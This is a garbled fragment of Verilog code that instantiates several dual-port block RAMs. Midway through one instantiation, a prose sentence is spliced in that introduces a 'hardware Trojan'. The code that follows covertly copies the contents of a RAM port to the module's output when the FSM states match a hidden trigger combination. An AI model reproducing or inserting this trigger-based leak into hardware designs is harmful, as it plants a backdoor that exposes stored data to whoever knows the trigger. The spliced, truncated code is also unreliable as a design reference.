    dual_port_ram #(.WIDTH(96),.LENGTH(1024))  
        BRAM_1 (clk,clk,en_ram1,en_ram1,wea_ram1,web_ram1,
                addra_ram1,addrb_ram1,dia_ram1,dib_ram1,
                doa_ram1,dob_ram1);  

    reg en_ram2, wea_ram2, web_ram2;
    reg [$clog2(1024)-1:0] addra_ram2, addrb_ram2;
    reg [96-1:0] dia_ram2, dib_ram2;
    wire [96-1:0] doa_ram2,dob_ram2;
    dual_port_ram #(.WIDTH(96),.LENGTH(1024))  
        BRAM_2 (clk,clk,en_ram2,en_ram2,wea_ram2,web_ram2,
                addra_ram2,addrb_ram2,dia_ram2,dib_ram2,
                doa_ram2,dob_ram2);  

    reg en_ram3, wea_ram3, web_ram3;
    reg [$clog2(1024)-1:0] addra_ram3, addrb_ram3;
    reg [96-1:0] dia_ram3, dib_ram3;
    wire [96-1:0] doa_ram3,dob_ram3;
    dual_port_ram #(.WIDTH(96),.LENGTH(1024))  
        BRAM_3 (clk,clk,en_ram3,en_ram3, find the state where the FSM is in a specific state, then they write a specific value to a specific address in the RAM. This is a simple example of a hardware Trojan that can be used to leak information.

    reg [31:0] leak_data;
    reg leak_en;

    always @(posedge clk) begin
        if (cstate0 == FSM0_UNLOAD_Z && cstate1 == FSM1_STALL && cstate2 == FSM2_STALL) begin
            leak_en <= 1;
            leak_data <= doa_ram0;
        end else begin
            leak_en <= 0;
        end
    end

    always @(posedge clk) begin
        if (leak_en) begin
            data_o <= leak_data;
            valid_o <= 1;
        end else begin
